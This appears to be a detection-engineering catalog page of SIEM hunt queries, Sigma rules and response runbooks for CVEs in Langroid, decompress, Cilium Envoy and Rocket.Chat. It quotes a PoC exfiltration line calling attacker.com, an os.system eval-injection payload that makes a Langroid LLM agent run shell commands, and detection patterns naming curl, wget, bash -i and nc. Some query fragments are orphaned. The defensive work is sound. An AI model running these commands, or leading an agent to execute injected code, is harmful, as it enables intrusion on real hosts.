| tstats summariesonly=false count, dc(Web.uri_path) as distinct_details, sum(Web.bytes_out) as bytes_out, values(Web.http_user_agent) as user_agents from datamodel=Web where Web.uri_path="/api/usage/request-details/*" AND Web.http_method="GET" AND Web.status=200 by Web.src, Web.dest, _time span=30m
| `drop_dm_object_name(Web)`
| where distinct_details >= 25   // 25+ distinct conversation UUIDs pulled by one src in 30m = enumeration, not a user reviewing their own history
| sort - distinct_details
OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Langroid python agent spawning shell child — CVE-2026-54769 pandas_eval os.system RCE · [LLM] Langroid full_eval=True dangerous config & eval-injection signature (CVE-2026-54769)

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Langroid python agent spawning shell child — CVE-2026-54769 pandas_eval os.system RCE AIExploitation High
Hunts the exploitation moment of CVE-2026-54769 where TableChatAgent.pandas_eval()/VectorStore eval() runs LLM-supplied Python like __import__('os').system(...), causing the host python process to spawn a /bin/sh child that executes the attacker command (the PoC uses touch /tmp/rce_success_table and curl http://attacker.com/pwned). Article-specific because it keys on a python parent immediately spawning a shell running the exact payload markers from the advisory. Rationale: Uses the advisory's concrete exploitation shape — python (Langroid) spawning a shell that runs the exact PoC markers touch /tmp/rce_success_table and curl, the OS-level fingerprint of __import__('os').system(). Cross-checked GHSA and GitLab advisory (patched 0.65.2, CVSS 10). Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/ • https://attack.mitre.org/techniques/T1059/006/
ATT&CKT1059.006 T1203
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Data-science python apps legitimately shelling out to curl/wget for dataset downloads
  • CI/CD python build scripts running chmod +x on artifacts in /tmp
  • Jupyter notebooks where a user runs os.system or ! shell magics
  • Legitimate Langroid deployments where a benign pandas expression happens to invoke a subprocess
  • Container entrypoint python wrappers that touch marker files in /tmp
Suppression filter
| where not (ProcessCommandLine has_any ("/opt/conda/","pip install","apt-get") and InitiatingProcessCommandLine has_any ("jupyter","ci-runner","build.py"))
Response runbook
1) Triage: pull the full process tree for the alerting host — confirm the python parent is a Langroid agent process and inspect the shell child's command line for network fetch or file drop. Check whether the installed langroid version is <=0.65.1. 2) Contain: isolate the host, kill the python agent process, and revoke any credentials/API keys reachable from that process environment; block the outbound destination the shell contacted. 3) Hunt: search the same host and peers for follow-on curl/wget downloads, new files in /tmp, cron/systemd persistence, and reverse-shell listeners; review agent input logs for the injected pandas_eval expression.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName startswith "python"
| where FileName in~ ("sh","bash","dash","zsh","ash")
| where ProcessCommandLine has_any ("curl ","wget ","touch /tmp/","/tmp/rce_success_table","chmod +x","bash -i","nc ")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has "python"
| where ActingProcessName has_any ("/sh","/bash","/dash","/zsh","/ash")
| where ActingProcessCommandLine has_any ("curl ","wget ","touch /tmp/","/tmp/rce_success_table","chmod +x","bash -i")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
title: Langroid Python Agent Spawning Shell for RCE Payload (CVE-2026-54769)
id: 4d9b2c17-6a3e-4f21-9c88-2b7e0f5a1d34
description: Detects a python-hosted Langroid agent (TableChatAgent/VectorStore) spawning a shell that runs attacker commands, indicating eval() sandbox escape RCE per CVE-2026-54769.
references:
  - https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
  - https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
author: SOC Detection Engineering
date: 2026/07/11
tags:
  - attack.t1059.006
  - attack.t1203
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/python'
      - '/python3'
  selection_child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
  selection_payload:
    CommandLine|contains:
      - 'curl '
      - 'wget '
      - 'touch /tmp/'
      - '/tmp/rce_success_table'
      - 'chmod +x'
  condition: selection_parent and selection_child and selection_payload
level: high
source:linux.auditd @auditd.type:EXECVE @process.name:(sh OR bash OR dash) @process.command_line:(*"curl "* OR *"wget "* OR *"touch /tmp/"* OR *"/tmp/rce_success_table"* OR *"chmod +x"*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^python[0-9.]*$/i
| ImageFileName=/\/(sh|bash|dash|zsh|ash)$/i
| CommandLine=/(curl |wget |touch \/tmp\/|\/tmp\/rce_success_table|chmod \+x|bash -i)/i
| table([_time, aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine])
ENDPOINT

| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("python","python3","python3.10","python3.11","python3.12") AND Processes.process_name IN ("sh","bash","dash","zsh","ash")) AND (Processes.process="*curl *" OR Processes.process="*wget *" OR Processes.process="*touch /tmp/*" OR Processes.process="*/tmp/rce_success_table*" OR Processes.process="*chmod +x*") by Processes.dest Processes.user Processes.parent_process Processes.process Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("python","python3","python3.10","python3.11","python3.12") AND Processes.process_name IN ("sh","bash","dash","zsh","ash")) AND (Processes.process="*curl *" OR Processes.process="*wget *" OR Processes.process="*touch /tmp/*" OR Processes.process="*/tmp/rce_success_table*" OR Processes.process="*chmod +x*") by Processes.dest Processes.user Processes.parent_process Processes.process Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
Ingress tool transfer from Langroid RCE — shell/python-descended curl/wget public egress (CVE-2026-54769) AICommand & Control Medium
Hunts post-exploitation payload staging after CVE-2026-54769, where the eval-injected os.system('curl http://attacker.com/pwned') causes curl/wget (spawned by the shell that python launched) to reach an external host. Article-specific because it ties the curl/wget egress back to a shell/python parent rather than flagging all curl usage. Rationale: Directly models the advisory's curl http://attacker.com/pwned staging step, anchored to a shell/python parent to stay tied to the eval-escape chain rather than generic downloads. Sentinel expressed process-side because ASIM lacks per-process network attribution. Corroborated via GHSA/GitLab advisory. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/ • https://attack.mitre.org/techniques/T1105/
ATT&CKT1105 T1059.006
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Python apps that legitimately shell out to curl/wget for API calls or model/dataset downloads
  • Package managers or setup scripts invoked from a shell fetching tarballs over HTTPS
  • Health-check or monitoring scripts curling internal-then-public endpoints
  • Data pipelines pulling remote CSV/JSON via curl
  • Developer sandboxes where interactive shells run curl to public services
Suppression filter
| where not (RemoteUrl has_any ("pypi.org","files.pythonhosted.org","github.com","githubusercontent.com") )
Response runbook
1) Triage: resolve the RemoteIP/RemoteUrl and check reputation; correlate the curl/wget event with a preceding python->shell spawn on the same host within seconds. 2) Contain: block the destination at egress, isolate the host if a payload was retrieved, and quarantine any file written by the curl/wget invocation. 3) Hunt: enumerate files created immediately after the download, check for execution of the fetched artifact, and pivot on the destination IP/domain across the fleet for other victims.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("curl","wget")
| where InitiatingProcessParentFileName in~ ("sh","bash","dash","zsh","ash","python","python3")
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("/curl","/wget")
| where ParentProcessName has_any ("/sh","/bash","/dash","/zsh","/python")
| where ActingProcessCommandLine has_any ("http://","https://","ftp://")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
source:linux.auditd @auditd.type:EXECVE @process.name:(curl OR wget) @process.command_line:(*"http://"* OR *"https://"* OR *"ftp://"*)
#event_simpleName=NetworkConnectIP4 ContextImageFileName=/\/(curl|wget)$/i
| NOT cidr("10.0.0.0/8", field=RemoteAddressIP4)
| NOT cidr("172.16.0.0/12", field=RemoteAddressIP4)
| NOT cidr("192.168.0.0/16", field=RemoteAddressIP4)
| NOT cidr("127.0.0.0/8", field=RemoteAddressIP4)
| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name IN ("curl","wget") AND Processes.parent_process_name IN ("sh","bash","dash","zsh","python","python3") AND (Processes.process="*http://*" OR Processes.process="*https://*" OR Processes.process="*ftp://*") by Processes.dest Processes.user Processes.parent_process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name IN ("curl","wget") AND Processes.parent_process_name IN ("sh","bash","dash","zsh","python","python3") AND (Processes.process="*http://*" OR Processes.process="*https://*" OR Processes.process="*ftp://*") by Processes.dest Processes.user Processes.parent_process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
Langroid full_eval=True dangerous config & eval-injection signature (CVE-2026-54769) AIExploitation Low
Config/exposure hunt for CVE-2026-54769: surfaces Langroid deployments that enable the gating parameter full_eval=True and python command lines carrying the vulnerable pandas_eval / TableChatAgent / VectorStore code paths. Article-specific because full_eval=True is the exact precondition the advisory names for the eval() sandbox escape in table_chat_agent.py L239 and vector_store/base.py L225. Rationale: Keys on the advisory's exact gating condition full_eval=True and the named vulnerable components (pandas_eval, TableChatAgent, table_chat_agent.py, vector_store/base.py) so SOCs can inventory exposed hosts running langroid<=0.65.1 before exploitation. Low confidence because config typically lives in files, not always the process cmdline. Corroborated via GHSA/GitLab (fixed 0.65.2). Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://advisories.gitlab.com/pypi/langroid/CVE-2026-54769/
ATT&CKT1203 T1059.006
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Benign Langroid deployments intentionally running with full_eval=True in a trusted/offline context
  • Developers testing TableChatAgent locally with sample DataFrames
  • Security researchers reproducing the PoC in a lab
  • Log lines echoing configuration during app startup without actual exploitation
  • CI test suites that import langroid.agent.special.table_chat_agent
Response runbook
1) Triage: confirm the host runs langroid<=0.65.1 and whether full_eval=True is actually set for a production, internet-/LLM-facing agent versus a local test. 2) Contain: disable full_eval / set full_eval=False, or upgrade langroid to >=0.65.2; restrict the agent's OS privileges and network egress. 3) Hunt: on any confirmed exposed host, pivot to UC1/UC2 to check for python->shell spawns or curl/wget staging that would indicate the config was already abused.
DeviceProcessEvents

Vulnerable @xhmikosr/decompress or decompress package present (CVE-2026-53486) AIWeaponization High
Inventory hunt that surfaces hosts carrying a decompress version affected by CVE-2026-53486 (@xhmikosr/decompress < 10.2.1, >= 11.0.0 < 11.1.3, or unmaintained decompress <= 4.2.1). These hosts can be pushed a crafted archive that writes/reads files outside the extraction directory, so they are the exposure baseline for the runtime detections below. Rationale: Keys off the exact CVE id CVE-2026-53486 from the advisory; TVM already tracks the fixed versions (10.2.1 / 11.1.3) so this is a clean deploy-blast-radius hunt rather than a behavioural one. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/ • https://vulert.com/vuln-db/CVE-2026-53486
ATT&CKT1195.001
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Package present but pinned behind a build stage that never extracts untrusted archives (dev-only devDependency)
  • Transitive copy already deduped to a fixed version at runtime while the tree still lists the vulnerable range
  • Container image layer cached with the old version but overridden at runtime
  • Air-gapped host that only ever extracts internally-produced archives
  • SBOM lists the package but the code path is dead / behind a disabled feature flag
Response runbook
Step 1 (triage): confirm the resolved runtime version (npm ls @xhmikosr/decompress / decompress) — a lockfile range is not the installed version. Step 2 (contain): for any host that extracts network-sourced archives, bump to @xhmikosr/decompress 11.1.3 (or 10.2.1) and, as interim mitigation, run extraction as a non-root user. Step 3 (hunt): pivot to the runtime UCs below on the same DeviceName to check whether an escape has already been attempted (symlink/hardlink creation, writes to /etc/cron.d, /etc/ld.so.preload, ~/.ssh/authorized_keys).

DeviceTvmSoftwareVulnerabilities

Node archive-extraction process writing to Linux persistence paths (decompress dir-escape) AIInstallation Medium
Hunts a Node.js process (the runtime that hosts the vulnerable decompress library) creating or modifying files under canonical persistence locations — cron drop-dirs, systemd unit dirs, sudoers.d, and SSH authorized_keys. CVE-2026-53486 lets a crafted archive escape the extraction root and land an entry anywhere the process can write; these directories are the highest-value landing zones and none are ever a legitimate output target for archive extraction. Rationale: Article states a crafted entry can be written 'outside that directory'; a node process (the decompress host) writing into cron/systemd/sudoers/authorized_keys is never a legitimate extraction target, so the destination path itself is the escape signal. Persistence paths are the MITRE-canonical landing zones for a write-anywhere primitive, not verbatim advisory strings — flagged as hunting for that reason. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9
ATT&CKT1053.003 T1098.004 T1543.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A Node-based config-management/IaC agent (e.g. a homegrown deployer) that legitimately writes systemd units
  • Node process management tools like pm2 generating a systemd unit via 'pm2 startup'
  • A CI runner written in Node that provisions cron jobs as part of a build
  • Cloud-init or provisioning scripts that shell out to node to template a sudoers.d fragment
  • Developer tooling that writes ~/.ssh/authorized_keys during a workstation bootstrap
Suppression filter
| where InitiatingProcessCommandLine !has "pm2" and InitiatingProcessCommandLine !has_any ("startup","deploy")
Response runbook
Step 1 (triage): pull the InitiatingProcessCommandLine and parent chain — a legitimate extraction targets an app/tmp dir, not /etc; confirm whether an archive was fetched over the network moments before (correlate FileCreated of a .tar/.zip in a temp dir by the same node PID). Step 2 (contain): quarantine/rollback the written file (cron/unit/authorized_keys), kill the node process, and revoke any SSH key added. Step 3 (hunt): sweep the host for the symlink/hardlink escape UC and for setuid/ld.so.preload writes; check for outbound C2 from any cron/systemd payload just dropped.

| where (FolderPath has_any ("/etc/cron.d","/etc/cron.hourly","/etc/cron.daily","/etc/cron.weekly","/etc/systemd/system","/usr/lib/systemd/system","/etc/sudoers.d")
        or (FileName =~ "authorized_keys" and FolderPath has "/.ssh"))

Node extraction writing ld.so.preload or setuid/privileged path as root (CVE-2026-53486 privesc) AIInstallation High
Alerts when a Node.js process running as root writes /etc/ld.so.preload or drops into privileged binary dirs (/usr/local/sbin, /usr/local/bin) during archive extraction. CVE-2026-53486 applies file modes with 'mode & ~umask', preserving setuid/setgid bits, and lets entries escape the output dir — so a root-context extraction can plant a preloaded library or a setuid binary for privilege escalation. This is near-zero in normal operation. Rationale: Anchored to the advisory's mode-bit finding ('File modes were applied as mode & ~umask ... does not remove the setuid, setgid, or sticky bits ... matters when extraction runs as root'). ld.so.preload and setuid drops into /usr/local/s?bin are the canonical root-write privesc targets for that primitive; keyed on InitiatingProcessAccountName==root to keep FP near zero. Cross-checked against: • https://github.com/advisories/GHSA-mp2f-45pm-3cg9 • https://advisories.gitlab.com/npm/decompress/CVE-2026-53486/
ATT&CKT1548.001 T1574.006
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A root-run Node build tool legitimately installing a native addon into /usr/local/bin
  • node-gyp / install scripts placing compiled helpers under /usr/local during a package build
  • In-house deployment tooling written in Node that manages ld.so.conf.d for custom libs
  • Container entrypoint (running as root) that node-templates a binary into /usr/local/bin
  • Monitoring/APM agent installers shelling through node to drop a preload shim
Suppression filter
| where InitiatingProcessCommandLine !has "node-gyp" and InitiatingProcessCommandLine !has_any ("install","rebuild","prebuild")
Response runbook
Step 1 (triage): inspect the written file — dump /etc/ld.so.preload contents or stat the /usr/local binary for setuid/setgid bits; confirm no legitimate root-run build (node-gyp, npm install of a native module) explains it. Step 2 (contain): isolate the host, remove the preload entry / setuid binary, and rotate any credentials reachable from root on that box; if in a container, kill and rebuild from a patched image (decompress >= 11.1.3). Step 3 (hunt): review process executions immediately after the write for any binary that loaded the preloaded library or ran with elevated tokens, and check the same host for the symlink-escape and persistence-path UCs.
DeviceFileEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("node","nodejs")
| where InitiatingProcessAccountName =~ "root"
| where FolderPath has "/etc/ld.so.preload" or FileName =~ "ld.so.preload"
      or FolderPath has_any ("/usr/local/sbin","/usr/local/bin","/etc/ld.so.conf.d")
| where InitiatingProcessParentFileName !in~ ("dpkg","apt","apt-get","rpm","yum","dnf","make","cloud-init")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, FileName, FolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(14d)
| where ActingProcessName has_any ("node","nodejs")
| where ActorUsername =~ "root"
| where TargetFilePath has_any ("/etc/ld.so.preload","/etc/ld.so.conf.d","/usr/local/sbin/","/usr/local/bin/")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, DvcAction, TargetFilePath
| order by TimeGenerated desc

Cilium Envoy admin socket abuse: TLS secret / config disclosure via admin.sock (CVE-2026-49445) AIActions on Objectives Medium
Hunts a local process on a Kubernetes node reading sensitive Envoy admin endpoints (/certs, /config_dump, /clusters) over the world-accessible Cilium Envoy admin.sock. Only cilium-agent/cilium-envoy should ever touch this socket, so any curl/wget/socat/python/nc process referencing it plus a read endpoint is anomalous and indicates exploitation of the mode-0777 socket. Rationale: Anchored on the concrete artifacts corroboration surfaced: the world-accessible socket is admin.sock (mode fixed to 0660 in PR #44512) and the article's 'Exposing TLS secrets' maps precisely to Envoy's /certs and /config_dump admin endpoints (Envoy admin docs). Excluding cilium-* binaries makes non-cilium access to this socket high-fidelity. Cross-checked against: • https://github.com/cilium/cilium/pull/44512 • https://www.envoyproxy.io/docs/envoy/latest/operations/admin.html • https://docs.cilium.io/en/stable/security/network/proxy/envoy/
ATT&CKT1552.001 T1005 T1613
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Cilium/Isovalent support engineer running `cilium-sysdump` or manual curl against admin.sock during troubleshooting
  • Custom Prometheus exporter or monitoring wrapper script scraping /stats or /config_dump for observability
  • Platform team debugging L7 policy by dumping Envoy config on a node
  • CI/e2e test harness that exercises the admin interface
  • SRE gathering diagnostics via a non-cilium helper script that shells out to curl
Suppression filter
| where not(ProcessCommandLine has_any ("cilium-sysdump", "cilium-dbg", "cilium-health", "cilium-bugtool"))
Response runbook
1) TRIAGE: Identify the acting process, its parent, and the user/UID. Confirm it is NOT cilium-agent/cilium-envoy and not a sanctioned sysdump/monitoring job. Capture which endpoint was hit — /certs and /config_dump mean TLS material and full mesh config may be disclosed. 2) CONTAIN: Isolate the node, rotate any TLS secrets/SDS certs served by Envoy on that node, and confirm Cilium is upgraded to a patched build (v1.17.14 / v1.18.8 / v1.19.2) so admin.sock is mode 0660. 3) HUNT: Pivot on the same host/UID for other admin.sock access, for destructive endpoint hits (/quitquitquit, /drain_listeners), for lateral movement from the identity, and search other nodes for the same process ancestry.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "admin.sock"
| where ProcessCommandLine has_any ("/certs", "config_dump", "/clusters", "server_info", "/stats", "/listeners", "/runtime")
| where FileName !in~ ("cilium-agent", "cilium-envoy", "cilium")
| where not(ProcessCommandLine has_any ("cilium-agent", "cilium-envoy"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has "admin.sock"
| where ActingProcessCommandLine has_any ("/certs", "config_dump", "/clusters", "server_info", "/stats", "/listeners", "/runtime")
| where ActingProcessName !has "cilium"
| where ActingProcessCommandLine !has "cilium-agent" and ActingProcessCommandLine !has "cilium-envoy"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

Cilium Envoy admin socket abuse: destructive DoS via /quitquitquit /drain_listeners (CVE-2026-49445) AIActions on Objectives High
Alerts when a local process invokes disruptive Envoy admin operations over the world-accessible Cilium admin.sock — /quitquitquit (terminate Envoy), /drain_listeners, /healthcheck/fail, /reset_counters. These directly implement the article's 'disrupting traffic' and 'terminating the Envoy process' impacts and have no legitimate manual use against the Cilium-managed Envoy. Rationale: The article explicitly lists 'Disrupting traffic in the cluster' and 'Terminating the Envoy process' as impacts; Envoy admin docs confirm /quitquitquit terminates the process and /drain_listeners + /healthcheck/fail disrupt serving. These are irreversible operational actions no legitimate operator issues against the Cilium-managed Envoy, making this alertable at high confidence. Cross-checked against: • https://github.com/cilium/cilium/pull/44512 • https://www.envoyproxy.io/docs/envoy/latest/operations/admin.html • https://docs.cilium.io/en/stable/security/network/proxy/envoy/
ATT&CKT1489 T1499
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator manually draining a node for maintenance who scripts /drain_listeners against the Cilium Envoy instead of using the node-drain workflow
  • Chaos-engineering / resilience test intentionally failing Envoy healthchecks
  • Support engineer restarting a wedged Envoy via /quitquitquit during an incident
  • Custom automation that resets Envoy stat counters via /reset_counters before a benchmark
Suppression filter
| where not(ProcessCommandLine has_any ("cilium-sysdump", "cilium-dbg", "cilium-bugtool"))
Response runbook
1) TRIAGE: Correlate the process/user/UID with any approved change or maintenance window; check whether Envoy on the node restarted or dropped L7 traffic immediately after (cilium-agent logs, pod readiness flaps). 2) CONTAIN: Cordon/isolate the node, restore Envoy (cilium-agent will respawn it) and verify L7 policy enforcement resumed, then ensure the cluster is upgraded to a patched Cilium (v1.17.14 / v1.18.8 / v1.19.2). 3) HUNT: Look for prior read abuse of the same admin.sock (/certs, /config_dump) from the same identity, repeated destructive calls across multiple nodes (coordinated DoS), and the initial access vector that placed the attacker on the node.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "admin.sock"
| where ProcessCommandLine has_any ("quitquitquit", "drain_listeners", "healthcheck/fail", "reset_counters")
| where FileName !in~ ("cilium-agent", "cilium-envoy", "cilium")
| where not(ProcessCommandLine has_any ("cilium-agent", "cilium-envoy"))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has "admin.sock"
| where ActingProcessCommandLine has_any ("quitquitquit", "drain_listeners", "healthcheck/fail", "reset_counters")
| where ActingProcessName !has "cilium"
| where ActingProcessCommandLine !has "cilium-agent" and ActingProcessCommandLine !has "cilium-envoy"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

2026-07-06 4 use cases 2 techniques 4 kill-chain phases detected

Rocket.Chat Livechat file-upload ID enumeration sweep (ObjectId harvest) AIActions on Objectives High
Hunts an unauthenticated source pulling many distinct /file-upload/{fileId} objects while carrying the Livechat authorization params (rc_room_type=l + rc_token) — the continuous ObjectId-prediction harvest described in the Aikido disclosure. High volume of distinct fileIds from one IP via the Livechat auth path is the signature of the mass file-capture exploit. Rationale: Anchors on the exact exploit request shape from the article's Python PoC — GET /file-upload/{fileId} with rc_room_type=l and rc_token query params — combined with a distinct-fileId volume threshold that captures the 'retrieve all generated valid IDs continuously' harvest. Legit Livechat file access does not fan out across dozens of unrelated fileIds. Cross-checked against: • https://www.aikido.dev/blog/predicting-mongodb-objectid-rocket-chat • https://hackerone.com/reports/3687142 • https://docs.rocket.chat/docs/rocketchat-security-fixes-updates-and-advisories • https://github.com/RocketChat/Rocket.Chat/releases/tag/8.5.0
ATT&CKT1213 T1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A genuinely busy Livechat helpdesk session where a visitor downloads many attachments the agent sent (all belonging to that room)
  • Load balancer / uptime monitor health-checking a file-upload URL repeatedly (usually one fixed path, not distinct fileIds)
  • Internal backup or migration tooling iterating over uploads with a service token
  • Authorized DAST/vulnerability scanner (Aikido, Burp) replaying the PoC against a staging instance
  • CDN origin prefetch pulling attachments
Suppression filter
| where UserAgents !has_any ("kube-probe","ELB-HealthChecker","UptimeRobot","Pingdom")
Response runbook
1) Triage: pull the source IP's full request timeline; confirm the requests carry rc_room_type=l + rc_token and hit many DISTINCT fileIds, and check whether the Rocket.Chat build predates 8.5.1/8.4.4/8.3.6/8.2.6/8.1.6/8.0.7/7.13.9/7.10.13 (vulnerable). 2) Contain: block the source IP at the WAF/reverse proxy, and if patch is not yet deployed, disable Livechat (Admin > Omnichannel) or upgrade immediately. 3) Hunt: enumerate which fileIds returned HTTP 200 to that IP to scope leaked files, and search for the same IP creating anonymous visitors (POST /api/v1/livechat/visitor) to identify the session token used.
ImWebSession
| where TimeGenerated > ago(1h)
| where Url has "/file-upload/" and (Url has "rc_room_type=l" or Url has "rc_token=")
| extend FileId = extract(@"/file-upload/([^/?]+)", 1, Url)
| where isnotempty(FileId)
| summarize DistinctFiles = dcount(FileId), Requests = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), UserAgents = make_set(HttpRequestHeaderUserAgent, 5), Statuses = make_set(HttpStatusCode, 10) by SrcIpAddr, DstHostname
| where DistinctFiles >= 25   // >=25 distinct file-upload IDs fetched via the Livechat auth path from one source in 1h = ObjectId harvest sweep
| order by DistinctFiles desc
WEB

| `drop_dm_object_name(Web)`
| where distinct_files >= 25
| `security_content_ctime(firstTime)`
| `security_content_ctime(lastTime)`
| sort - distinct_files

| `drop_dm_object_name(Web)`

| `security_content_ctime(lastTime)`

Rocket.Chat anonymous Livechat visitor bootstrap chained to file-upload access AIExploitation Medium
Detects the full unauthenticated exploit chain: a single source registering an anonymous Livechat visitor (POST /api/v1/livechat/visitor), requesting a room (GET /api/v1/livechat/room), then reading files via /file-upload/ within a short window. This is the session-bootstrap primitive the exploit uses to mint a valid rc_token/rc_rid before harvesting arbitrary files. Rationale: Chains the three exact endpoints from the PoC (POST /api/v1/livechat/visitor, GET /api/v1/livechat/room, GET /file-upload/) within a 10-minute window keyed on source IP — the minimum footprint of the unauthenticated access-control bypass. Individually noisy, together it is the exploit workflow. Cross-checked against: • https://www.aikido.dev/blog/predicting-mongodb-objectid-rocket-chat • https://hackerone.com/reports/3687142 • https://github.com/RocketChat/Rocket.Chat/releases/tag/8.5.0
ATT&CKT1190 T1213
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A real anonymous helpdesk visitor who opens Livechat and then downloads a file the agent shared (legitimate, same room)
  • Synthetic monitoring that scripts a Livechat conversation end-to-end
  • Support-widget embedded on a high-traffic page generating many short-lived visitor sessions
  • Rocket.Chat mobile/desktop client polling room + upload endpoints during normal use
  • Pen-test / bug-bounty researcher reproducing the chain on an authorized instance
Response runbook
1) Triage: confirm the visitor registration and file reads share one SrcIpAddr and that the /file-upload/ requests carry rc_room_type=l; verify the instance version against the patched list. 2) Contain: block the IP at the proxy/WAF and, if unpatched, disable Livechat or upgrade to the fixed build. 3) Hunt: pivot on the source IP to the enumeration-sweep detection to measure how many files were pulled, and review Content-Disposition/response sizes to identify sensitive filenames leaked.
ImWebSession
| where TimeGenerated > ago(1h)
| where Url has_any ("/api/v1/livechat/visitor", "/api/v1/livechat/room", "/file-upload/")
| extend isVisitor = Url has "/api/v1/livechat/visitor", isRoom = Url has "/api/v1/livechat/room", isFile = Url has "/file-upload/"
| summarize VisitorReg = countif(isVisitor), RoomReq = countif(isRoom), FileReq = countif(isFile), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by SrcIpAddr, DstHostname, bin(TimeGenerated, 10m)
